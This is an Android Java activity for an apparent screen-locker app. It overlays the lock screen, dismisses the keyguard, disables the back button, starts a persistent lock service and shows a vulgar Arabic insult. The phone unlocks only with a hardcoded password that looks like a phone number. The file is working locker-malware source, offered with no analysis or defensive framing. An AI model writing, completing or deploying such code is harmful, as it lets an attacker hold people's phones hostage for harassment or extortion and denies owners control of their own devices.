package com.emperor.phonelock;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    
    private static final String PASSWORD = "01064996771";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock);
        
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        
        setupUI();
        startService(new Intent(this, LockService.class));
    }
    
    private void setupUI() {
        TextView messageText = findViewById(R.id.message_text);
        EditText passwordInput = findViewById(R.id.password_input);
        Button unlockButton = findViewById(R.id.unlock_button);
        
        messageText.setText("كسمك علشان تعرف انت بتكلم مين");
        
        unlockButton.setOnClickListener(v -> {
            String input = passwordInput.getText().toString().trim();
            if (input.equals(PASSWORD)) {
                stopService(new Intent(MainActivity.this, LockService.class));
                finish();
            } else {
                Toast.makeText(this, "❌ كلمة السر خاطئة!", Toast.LENGTH_SHORT).show();
                passwordInput.setText("");
            }
        });
    }
    
    @Override
    public void onBackPressed() {
        Toast.makeText(this, "🔒 لا يمكنك الخروج!", Toast.LENGTH_SHORT).show();
    }
}
